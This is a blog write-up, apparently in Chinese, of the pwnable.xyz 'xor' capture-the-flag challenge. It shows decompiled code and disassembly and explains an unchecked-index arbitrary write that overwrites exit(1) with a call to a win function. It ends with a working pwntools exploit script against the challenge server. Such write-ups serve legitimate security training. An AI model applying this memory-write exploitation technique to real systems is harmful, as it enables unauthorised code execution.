---
title: pwnable_xor
date: 2019-12-06 13:13:48
tags:
- pwn
- pwnable.xyz
---

# pwnable xor

首先看一下程序的情况：

![](https://i.loli.net/2019/12/06/M7RQmxNu2VP5jy9.png)

如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过

所幸没有，可以通过栈溢出覆盖地址。

老规矩，反编译一下代码：

看一下`main`函数：

```c
// Address range: 0xa34 - 0xb1f
int main(int argc, char ** argv) {
    // 0xa34
    __readfsqword(40);
    puts("The Poopolator");
    setup();
    while (true) {
        int64_t v1 = 0; // bp-24
        printf((char *)&g8);
        int64_t v2; // bp-32
        int64_t v3; // bp-40
        int32_t items_assigned = scanf("%ld %ld %ld", &v3, &v2, &v1);
        if (v3 == 0) {
            // break -> 0xac3
            break;
        }
        if (v2 == 0) {
            // break -> 0xac3
            break;
        }
        int64_t v4 = v1;
        if (v4 == 0) {
            // break -> 0xac3
            break;
        }
        if (items_assigned == 3 != v4 < 10) {
            // break -> 0xac3
            break;
        }
        // 0xacd
        *(int64_t *)(8 * v4 + (int64_t)&g7) = v2 ^ v3;
        int64_t v5 = *(int64_t *)(8 * v4 + (int64_t)&g7);
        printf("Result: %ld\n", (int32_t)v5);
    }
    // 0xac3
    exit(1);
    // UNREACHABLE
}
```

可以看到一下语句可以利用一下：

`*(int64_t *)(8 * v4 + (int64_t)&g7) = v2 ^ v3;`

通过输入`v2`,`v3`,`v4`可以修改任意地址。

而我们的目的是调用`win`函数，所以需要调用到`win`的起始地址。

那我们来看一下`win函数：

```c
// Address range: 0xa21 - 0xa34
int64_t win(void) {
    // 0xa21
    return system("cat flag");	//显然是需要的操作。😄
}
```

```assembly
; function: win at 0xa21 -- 0xa34
0xa21:      55                           	push rbp
0xa22:      48 89 e5                     	mov rbp, rsp
0xa25:      48 8d 3d 78 01 00 00         	lea rdi, [rip + 0x178]
0xa2c:      e8 c7 fd ff ff               	call 0x7f8 <system>
0xa31:      90                           	nop 
0xa32:      5d                           	pop rbp
0xa33:      c3                           	ret 
```

所以需要调用到`win`的起始地址`0xa21`，

由于看到`win`函数正好有一个可以利用的地方`exit(1);`

所以可以通过修改这个的地址来调用`win`.

那思路就显而易见了。

### 过程：

首先通过输入`v2`,`v3`,`v4`来把`exit(1)`的汇编指令改成`call 0xa21`，

再次输入不符要求的`v2`,`v3`,`v4`即可跳转到`exit(1)`的位置，即可调用`win`函数。

### 代码：

```python
from pwn import *
from Crypto.Util.number import bytes_to_long
context.log_level = 'DEBUG'

e = ELF("./challenge")
r = remote("svc.pwnable.xyz", 30029)

exit_addr = 0xac8
win_addr = 0xa21
result_addr = 0x202200

e.asm(exit_addr, "call 0x%x"%win_addr)
input_num = e.read(exit_addr, 5)

input_num = bytes_to_long(input_num[::-1])	#change endian

v2 = 1
v3 = input_num^1
v4 = (exit_addr - result_addr) / 8

#r = process("./challenge")

r.sendlineafter("   ", "%d %d %d"%(v2, v3, v4))
r.sendlineafter("   ", "a")

r.interactive()

r.close()
```



